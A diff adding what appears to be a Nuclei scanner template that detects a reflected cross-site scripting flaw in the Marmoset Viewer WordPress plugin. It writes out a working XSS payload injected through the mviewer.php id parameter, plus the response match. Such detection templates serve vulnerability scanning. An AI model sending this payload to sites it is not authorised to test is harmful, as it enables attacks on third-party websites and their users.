@@ -1,0 +1,22 @@
+id: wp-plugin-marmoset-viewer-xss
+info:
+  author: johnjhacking
+  name: Wordpress Plugin Marmoset Viewer XSS
+  reference: https://wordpress.org/plugins/marmoset-viewer/#developers
+  severity: medium
+  tags: wordpress,xss
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - </script><svg/onload=alert('{{randstr}}')>
+    - Marmoset Viewer
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%27{{randstr}}%27)>'
